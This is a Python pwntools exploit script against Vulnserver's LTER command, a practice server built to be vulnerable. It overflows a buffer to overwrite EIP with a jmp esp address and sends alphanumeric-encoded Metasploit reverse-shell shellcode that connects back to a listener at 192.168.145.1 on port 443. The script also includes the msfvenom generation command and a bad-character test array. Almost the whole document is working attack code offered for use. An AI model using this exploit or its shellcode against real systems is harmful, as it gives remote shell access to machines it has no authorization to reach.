#!/usr/bin/python3

# ============================================
# Vulnserver LTER exploit using EIP overwrite
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"LTER /.:/"  # this should cause the crash
crash = 3000  # a payload of this size triggers the crash

# === EIP overwrite ===

cyclic_pattern = str.encode(cyclic(4000, "123456789ABCDEF"))

# cyclic_pattern = cyclic_metasploit(4000) # metasploit version

offset = 2003  # above 2000
# offset = 3515 # offset of EIP
junk = b"A" * offset
eip = b"BBBB"  # To test if we successfully overwrite the EIP
new_eip = p32(0x62501203)  # jmp esp address converted to little endian

# === for testing badchars ===
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

)

# === Payload ===

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.145.1 LPORT=443 -f c -b '\x00' -e x86/alpha_mixed BufferRegister=ESP
# Converted to binary using binascii
shellcode = binascii.unhexlify("54594949494949494949494949494949494937515a6a415850304130416b41415132414232424230424241425850384142754a494b4c68686e6245505770733055306c496a4555614f3032444c4b763046506c4b5272744c6e6b536276746e6b70724648566f4c77615a61367031796f6e4c556c6531434c4662764c37506a617a6f566d37715a6779727a52505262774c4b663246706c4b737a456c6e6b326c476132587a4342684661385133616e6b7149775043314e334e6b504932386863356a71596c4b54744e6b577178564561796f4e4c7a61584f644d6661484747483970325539667443334d3878356b716d71345165597476386c4b7638764463316e3351766e6b666c626b6e6b3058754c75515a734c4b47744c4b57716a706c49626451343754736b636b50613059705a66316b4f4b50614f336f714a4c4b4672786b6e6d436d524845637032733045504248425732537562614f61446538726c525745765667796f39456f484c507661777045503579395442745270717867596d50706b4550696f6b653630363046305050673032707150327065386b5a466f4b6f39706b4f39456d47424a455542484b704c686e71477133583332777057716f4b6f795a46317a32304636505772487a394d7571647061796f4e354b354b705434444c396f326e466830757a4c635858706c756f527366596f794551785533724d424437706b39386332773637727754714c36635a54523059705639726b4d33564a6761544644474c577143316e6d7154457442306846677077345634463031467366705650466276304e627643665363663661785349384c774f6e66396f38556f796b50304e527643764b4f7650435854486b37754d6170396f58556d6b6970476d464a466a30686c666a356f4d4d4d596f6b65656c5556334c577a6b30396b4970534545554d6b637762333342624f435a53303633796f6e354141")

payload = b"".join([
    vulncmd,
    junk,
    new_eip,
    shellcode

])

payload += b"C" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[+] Payload sent!")
s.close()